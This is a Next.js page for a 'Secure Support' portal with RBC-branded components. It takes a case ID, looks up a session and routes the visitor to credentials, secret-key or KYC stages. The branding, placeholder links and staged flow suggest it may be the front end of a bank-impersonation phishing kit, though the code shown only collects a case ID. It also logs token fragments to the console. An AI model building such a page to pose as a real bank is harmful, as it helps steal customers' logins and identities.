'use client';

/**
 * Landing/Home Page
 *
 * Entry point for customer-initiated verification path
 * Customer enters case ID and is redirected to session UUID
 */

import { useCallback, useState } from 'react';
import { useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCInput, RBCButton, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { AlertCircle } from 'lucide-react';

export default function HomePage() {
  const router = useRouter();

  const [caseId, setCaseId] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Handle case ID submission
   */
  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId.trim()) {
        setFieldError('Please enter your case ID');
        return;
      }

      setIsLoading(true);

      try {
        // Lookup existing session by case ID
        const response = await fetch('/api/session/lookup-by-case-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            caseId: caseId.trim(),
          }),
        });

        if (!response.ok) {
          const error = await response.json();
          setFieldError(
            error.error || 'Unable to validate case ID. Please try again.'
          );
          return;
        }

        const data = await response.json();
        const sessionUuid = data.sessionUuid;
        const returnedCaseId = data.caseId;
        const currentStage = data.next_step || 'credentials'; // Backend returns current stage
        const guestToken = data.guestToken;

        console.log('[HomePage] API Response:', {
          sessionUuid,
          caseId: returnedCaseId,
          guestToken: guestToken ? `${guestToken.substring(0, 20)}...` : null,
          hasToken: !!guestToken,
          fullResponse: data
        });

        if (!sessionUuid) {
          setFieldError('Unable to validate case ID. Please try again.');
          return;
        }

        // Map stage name to route (secret_key -> secret-key)
        const stageToRoute: Record<string, string> = {
          'secret_key': 'secret-key',
          'credentials': 'credentials',
          'kyc': 'kyc',
          'completed': 'completed',
          'terminated': 'terminated',
        };
        const route = stageToRoute[currentStage] || 'credentials';

        // Store session UUID, case ID, and guest token in session store
        console.log('[HomePage] Storing in Zustand:', { sessionUuid, guestToken: guestToken ? 'present' : 'MISSING' });
        useSessionStore.setState({
          sessionUuid,
          caseId: returnedCaseId,
          guestToken,
          stage: currentStage as any,
        });

        // Redirect to current stage (session resumption)
        router.push(`/${sessionUuid}/${route}`);
      } catch (error) {
        console.error('Error:', error);
        setFieldError('Unable to validate case ID. Please try again.');
      } finally {
        setIsLoading(false);
      }
    },
    [caseId, router]
  );

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        <div className="mb-[40px] pb-[15px] border-b border-border">
          <h1 className="text-[18px] md:text-[20px] text-foreground font-normal m-0">
            Secure Support
          </h1>
          <p className="text-[#555] text-[13px] mt-[10px] font-normal leading-snug">
            Please enter your support reference number.
          </p>
        </div>

        {isLoading ? (
          <RBCWaitingState
            message="Validating your case ID..."
            steps={VERIFICATION_STEPS.caseId}
          />
        ) : (
          <form onSubmit={handleSubmit} className="w-full mb-5 flex flex-col" noValidate>
            <div className="flex flex-col gap-[10px]">
              <RBCInput
                id="caseId"
                name="caseId"
                type="text"
                label="Case ID"
                placeholder=""
                value={caseId}
                onChange={(e) => {
                  setCaseId(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                disabled={isLoading}
                autoComplete="off"
                required
                showLockIcon={true}
              />
            </div>

            {/* Error message */}
            {fieldError && (
              <div className="flex items-center gap-2 text-sm text-destructive mb-4">
                <AlertCircle className="h-4 w-4" />
                <span>{fieldError}</span>
              </div>
            )}

            <div className="my-[10px]">
              <RBCButton type="submit" disabled={!caseId.trim() || isLoading}>
                {isLoading ? 'Processing...' : 'Next'}
              </RBCButton>
            </div>

            <div className="flex items-center gap-[10px] mt-[5px]">
              <a href="#" className="text-accent no-underline text-[13px] transition-colors hover:underline">
                Recover Your Case ID
              </a>
              <span className="text-[#ccc] text-[12px]">|</span>
              <a href="#" className="text-accent no-underline text-[13px] transition-colors hover:underline">
                Contact Support
              </a>
            </div>
          </form>
        )}
      </div>
    </SplitLayout>
  );
}
